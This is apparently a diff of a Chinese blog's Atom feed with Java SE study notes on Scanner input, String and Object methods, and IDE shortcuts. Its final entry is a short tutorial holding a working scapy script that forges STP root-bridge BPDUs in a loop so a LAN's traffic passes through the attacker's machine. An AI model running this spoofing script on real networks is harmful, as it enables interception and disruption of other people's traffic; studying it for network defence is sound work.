title="获取键盘输入String需要注意的"></a>获取键盘输入String需要注意的</h1><blockquote><p>System.in</p><p>它是标准的输入流，对应着键盘录入</p><p>sc.hasNextxxx（）</p><p>它判断输入的数是不是xxx数据类型，xxx可以是int、double等</p><p>sc.nextxxx（）</p><p>它获取已经输入的项，xxx和上面的xxx相同</p><p>sc.nextLine()</p><p>它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。</p><p>例：nextInt() 之后又用 nexiLine()</p><p>获取的是整数，而实际是全部内容为  <code>数值/r/n</code>  此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。</p></blockquote><ul><li>解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。</li></ul><h1 id="String的构造方法"><a href="#String的构造方法" class="headerlink" title="String的构造方法"></a>String的构造方法</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b);</span><br><span class="line"><span class="comment">//有参构造</span></span><br></pre></td></tr></table></figure><blockquote><p>可以按照平台的默认字符集（也就是码表，GBK等等）<code>解码byte</code>数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。</p></blockquote><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b,<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//表示从b数组中的第二个索引开始解码，总共解码4个数据</span></span><br></pre></td></tr></table></figure><h1 id="String类的判断功能"><a href="#String类的判断功能" class="headerlink" title="String类的判断功能"></a>String类的判断功能</h1><ul><li>.equals()<blockquote><p>比较字符串内容序列是否相同，区分大小写</p></blockquote></li><li>.equalsIgnoreCase()<blockquote><p>与上面不同的是：不区分大小写</p></blockquote></li><li>.contains()<blockquote><p>判断字符串中是否包含传入的字符串</p></blockquote></li><li>.startsWith()<blockquote><p>判断字符串是否以传入字符串开头</p></blockquote></li><li>.endswith()<blockquote><p>判断字符串是否以传入字符串结尾</p></blockquote></li><li>.isEmpty()    <blockquote><p>判断字符串是否为空</p></blockquote></li></ul><h1 id="Null与””的区别"><a href="#Null与””的区别" class="headerlink" title="Null与””的区别"></a>Null与””的区别</h1><blockquote><p>“”是<code>字符串常量</code>，也是String类的对象，所以可以调用String类的方法</p><p>Null是<code>空常量</code>，不能调用任何方法，否则会出现空指针异常，Null可以给<code>任意引用数据类型</code>赋值。</p></blockquote><ul><li>注意事项：<blockquote><p>1、以后比较字符串时最好<code>都用equals</code>，因为equals比较的是内容，而==号比较的时后，有时比较的是<code>地址值</code></p><p>2、使用equals时，有常量就用常量对象的equals方法，<code>尽量不用变量对象的equals方法</code>，因为变量对象的值有<code>可能时null</code>，调用<code>equals方法会出现空指针异常</code></p></blockquote></li></ul><h1 id="String类的获取功能"><a href="#String类的获取功能" class="headerlink" title="String类的获取功能"></a>String类的获取功能</h1><ul><li>.length()<blockquote><p>获取字符串长度(字符个数)    </p><p>例子：<code>&quot;我&quot;.length()</code> 为1</p><p>ps：数组中的length是<code>属性</code>，而String中的是对象<code>方法</code></p></blockquote></li><li>.charAt()<blockquote><p>获取指定索引的字符</p></blockquote></li><li>.indexOf()    <blockquote><p>返回字符 或 字符串在此字符串中<code>第一次出现的索引</code></p><p>如果不存在返回-1</p><p>如果查找的是字符串，返回索引就是查找字符串<code>第一个字符的索引</code></p></blockquote></li><li>.indexOf(,)<blockquote><p>与上面不同的是在某个位置之后查找</p></blockquote></li><li>.lastIndexOf()    <blockquote><p>从后向前找</p></blockquote></li><li>.substring()<blockquote><p>从指定位置开始<code>截取字符串</code>，默认到末尾</p></blockquote></li><li>.substring(,)<blockquote><p>与上不同的是自己<code>指定了截取字符串的尾部位置</code>并且，<code>包含头不包含尾部</code></p><p>注意：截取字符串之后需要用一个变量来保存，因为substring是<code>不会改变原来的值</code>的。</p></blockquote></li></ul><h1 id="GBK码表的特性"><a href="#GBK码表的特性" class="headerlink" title="GBK码表的特性"></a>GBK码表的特性</h1><blockquote><p>1、中文是<code>两个字节</code>组成</p><p>2、中文字节的<code>第一个字节一定是负数</code></p></blockquote><h1 id="String类的类型转换功能"><a href="#String类的类型转换功能" class="headerlink" title="String类的类型转换功能"></a>String类的<code>类型转换</code>功能</h1><ul><li>.getBytes()<blockquote><p>把<code>字符串转换成字节数组</code>，这是一个编码的过程：<code>把我们看的懂的编码成计算机看得懂的</code></p></blockquote></li><li>.toCharArray()<blockquote><p>转换成字符数组</p></blockquote></li><li>String.valueOf（）<blockquote><p>把字符数组转换为字符串，传入一个字符数组，返回一个字符串</p><p>注意：    </p><p>1、传入的数组类型可以是<code>任意类型</code>，并且底层还是由String的<code>构造方法</code>来解码的。</p><p>2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法</p></blockquote></li><li>.toLowerCase()<blockquote><p>把字符串转换为小写</p></blockquote></li><li>.toUpperase()<blockquote><p>把字符串转换为大写</p></blockquote></li></ul><p>ps：String中字符的转换都是按照unicode码表来转换的</p><h1 id="String的其他功能"><a href="#String的其他功能" class="headerlink" title="String的其他功能"></a>String的其他功能</h1><ul><li>.repleace(被替换的字符串，要替换成的字符串)<blockquote><p>字符或字符串替换，不存在则不改变</p></blockquote></li><li>.trim()<blockquote><p>去除首尾空格</p></blockquote></li><li>.compareTo()<blockquote><p>按照字典顺序比较两个字符串</p></blockquote></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;String类的概述&quot;&gt;&lt;a href=&quot;#String类的概述&quot; class=&quot;headerlink&quot; title=&quot;String类的概述&quot;&gt;&lt;/a&gt;String类的概述&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个&lt;code&gt;基本数据类型&lt;/code&gt;，但其实它是一个&lt;code&gt;引用数据类型&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="String类" scheme="http://liuhaoan.github.io/tags/String%E7%B1%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——Object类</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Object类/</id>
+    <published>2019-04-09T07:19:43.000Z</published>
+    <updated>2019-04-09T07:40:26.878Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Object类中的常用方法"><a href="#Object类中的常用方法" class="headerlink" title="Object类中的常用方法"></a>Object类中的常用方法</h1><ul><li>类名.getClass()<blockquote><p>获取这个类对象的字节码</p></blockquote></li><li><p>字节码名.getName()</p><blockquote><p>获取类的名称</p></blockquote></li><li><p>.equals(对象)</p><blockquote><p>判断<code>调用此方法的对象</code>和<code>传入对象</code>的值是否一样</p></blockquote></li></ul><ul><li>toString方法<blockquote><p>这是object里的方法，默认打印有@的内容(<code>其实是这个对象在堆内存中的地址值</code>)，因为<code>所有类都是默认继承Object类的</code>，所以重写它可以更好的显示属性值。</p><p>注：直接打印输出某个对象的引用那么<code>系统默认</code>会直接调用<code>该对象</code>的toString显示属性值，如果该类<code>没有重写</code>toString方法，默认打印该类在<code>堆内存中的地址值</code>。</p></blockquote></li></ul><a id="more"></a><h1 id="重写toString代码示例："><a href="#重写toString代码示例：" class="headerlink" title="重写toString代码示例："></a>重写toString代码示例：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Stirng <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> name + <span class="string">","</span> + age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h1><ul><li>equals方法默认是比较<code>地址值</code>，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象<code>没有重写equals</code>，那么调用它是无意义的。</li></ul><h1 id="重写equals代码演示："><a href="#重写equals代码演示：" class="headerlink" title="重写equals代码演示："></a>重写equals代码演示：</h1><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写equals方法</span></span><br><span class="line"><span class="keyword">public</span> boolean equals(Object obj) &#123;</span><br><span class="line">Student  s = (Student)obj;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.name.equals(s.name) &amp;&amp;<span class="keyword">this</span>.age == s.age;<span class="comment">//这里的equals调用的是string里的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==号和equsls的区别（面试可能问道）：<br>    1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是</p><p>数据值，比较引用数据类型比较的是地址的值<br>    2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没</p><p>有意义，但是我们可以重写它使其有意义。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Object类中的常用方法&quot;&gt;&lt;a href=&quot;#Object类中的常用方法&quot; class=&quot;headerlink&quot; title=&quot;Object类中的常用方法&quot;&gt;&lt;/a&gt;Object类中的常用方法&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;类名.getClass()&lt;blockquote&gt;
+&lt;p&gt;获取这个类对象的字节码&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;字节码名.getName()&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;获取类的名称&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;.equals(对象)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;判断&lt;code&gt;调用此方法的对象&lt;/code&gt;和&lt;code&gt;传入对象&lt;/code&gt;的值是否一样&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;toString方法&lt;blockquote&gt;
+&lt;p&gt;这是object里的方法，默认打印有@的内容(&lt;code&gt;其实是这个对象在堆内存中的地址值&lt;/code&gt;)，因为&lt;code&gt;所有类都是默认继承Object类的&lt;/code&gt;，所以重写它可以更好的显示属性值。&lt;/p&gt;
+&lt;p&gt;注：直接打印输出某个对象的引用那么&lt;code&gt;系统默认&lt;/code&gt;会直接调用&lt;code&gt;该对象&lt;/code&gt;的toString显示属性值，如果该类&lt;code&gt;没有重写&lt;/code&gt;toString方法，默认打印该类在&lt;code&gt;堆内存中的地址值&lt;/code&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="Object类" scheme="http://liuhaoan.github.io/tags/Object%E7%B1%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——Idea常用快捷键</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Idea常用快捷键/</id>
+    <published>2019-04-09T07:14:05.000Z</published>
+    <updated>2019-04-09T07:19:06.850Z</updated>
+    
+    <content type="html"><![CDATA[<p>暂时就这些吧</p><ul><li><p>alt+enter</p><blockquote><p>导入包，代码自动修正</p></blockquote></li><li><p>alt + /</p><blockquote><p>代码提示</p></blockquote></li></ul><a id="more"></a><ul><li>ctrl+Y    <blockquote><p>删除光标所在行</p></blockquote></li></ul><ul><li>ctrl+D    <blockquote><p>复制光标所在行，并且粘贴在它的下面</p></blockquote></li></ul><ul><li>ctrl+alt+L    <blockquote><p>格式化代码</p></blockquote></li></ul><ul><li>ctrl+/    <blockquote><p>单行注释</p></blockquote></li></ul><ul><li>Ctrl+shift+/<blockquote><p>选中行注释，多行注释</p></blockquote></li></ul><ul><li>alt+ins<blockquote><p>自动生成代码，get、set等</p></blockquote></li></ul><ul><li>alt+shift+上下箭<blockquote><p>移动当前代码行</p></blockquote></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;暂时就这些吧&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;alt+enter&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;导入包，代码自动修正&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;alt + /&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;代码提示&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="idea快捷键" scheme="http://liuhaoan.github.io/tags/idea%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>javaSE复习之——Eclipse常用快捷键</title>
+    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Eclipse常用快捷键/</id>
+    <published>2019-04-09T07:00:39.000Z</published>
+    <updated>2019-04-09T07:31:25.025Z</updated>
+    
+    <content type="html"><![CDATA[<p>常用的应该就这些了</p><p>Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 </p><p>ctrl + n 新建<br><a id="more"></a><br>ctrl + shift + f 格式化代码，使代码更简洁 </p><p>ctrl + / 注释 也可以ctrl + shift + /或\ </p><p>F3或ctrl + 鼠标点击 查看源码 </p><p>ctrl + 1 给建议 </p><p>alt + shift + m 抽取一段代码成方法，省去了复制 </p><p>alt + shift + r 改名，在改变量是非常好用</p><p>shift + alt + s 生成toString</p><p>Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定)</p><p>Ctrl+D: 删除当前行  </p><p>Ctrl+Alt+↓ 复制当前行到下一行(复制增加) </p><p>Ctrl+Alt+↑ 复制当前行到上一行(复制增加) </p><p>Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) </p><p>Alt+↑ 当前行和上面一行交互位置(同上)</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;常用的应该就这些了&lt;/p&gt;
+&lt;p&gt;Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 &lt;/p&gt;
+&lt;p&gt;ctrl + n 新建&lt;br&gt;
+    
+    </summary>
+    
+      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+    
+    
+      <category term="Eclipse快捷键" scheme="http://liuhaoan.github.io/tags/Eclipse%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络攻防之——Python实现生成树协议(STP)欺骗攻击</title>
     <link href="http://liuhaoan.github.io/2019/04/09/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/"/>
     <id>http://liuhaoan.github.io/2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/</id>
     <published>2019-04-09T02:09:48.000Z</published>
-    <updated>2019-04-09T02:18:53.263Z</updated>
+    <updated>2019-04-09T06:54:07.448Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="何为生成树协议欺骗攻击？"><a href="#何为生成树协议欺骗攻击？" class="headerlink" title="何为生成树协议欺骗攻击？"></a>何为生成树协议欺骗攻击？</h1><ul><li>所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来位置下游设备之间的关系<blockquote><p>根桥其实</p></blockquote></li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> scapy.all import *</span><br><span class="line"></span><br><span class="line">eth = Dot3(<span class="attribute">dst</span>=<span class="string">"01:80:c2:00:00:00"</span>, <span class="attribute">src</span>=<span class="string">"00:0c:29:02:03:48"</span>)</span><br><span class="line"></span><br><span class="line">llc = LLC(<span class="attribute">dsap</span>=0x42,ssap=0x42,ctrl=0x03)</span><br><span class="line"></span><br><span class="line">stp = STP(<span class="attribute">rootid</span>=0, <span class="attribute">rootmac</span>=<span class="string">"00:0c:29:02:03:48"</span>, <span class="attribute">bridgeid</span>=0, <span class="attribute">bridgemac</span>=<span class="string">"00:0c:29:02:03:48"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="attribute">pkt</span>=sendp(eth/llc/stp,inter=2,loop=1)</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h1 id="何为生成树协议欺骗攻击？"><a href="#何为生成树协议欺骗攻击？" class="headerlink" title="何为生成树协议欺骗攻击？"></a>何为生成树协议欺骗攻击？</h1><ul><li>所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系<blockquote><p>我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。</p></blockquote></li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"><span class="section">//01:80:c2:00:00:00这个是一个组播地址</span></span><br><span class="line"></span><br><span class="line">eth = Dot3(dst=<span class="string">"01:80:c2:00:00:00"</span>, src=<span class="string">"自己的MAC地址"</span>)</span><br><span class="line"></span><br><span class="line">llc = LLC()</span><br><span class="line"></span><br><span class="line">stp = STP(rootid=0, rootmac=<span class="string">"自己的MAC地址"</span>, bridgeid=0, bridgemac=<span class="string">"自己的MAC地址"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pkt=sendp(eth/llc/stp,inter=2,loop=1)</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
       &lt;h1 id=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;a href=&quot;#何为生成树协议欺骗攻击？&quot; class=&quot;headerlink&quot; title=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;/a&gt;何为生成树协议欺骗攻击？&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来位置下游设备之间的关系&lt;blockquote&gt;
-&lt;p&gt;根桥其实&lt;/p&gt;
+&lt;li&gt;所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系&lt;blockquote&gt;
+&lt;p&gt;我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -37,14 +393,14 @@
     
     </summary>
     
-      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
+      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
     
     
       <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
     
-      <category term="生成树协议欺骗" scheme="http://liuhaoan.github.io/tags/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97/"/>
-    
       <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
+    
+      <category term="生成树协议欺骗" scheme="http://liuhaoan.github.io/tags/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97/"/>
     
   </entry>
   
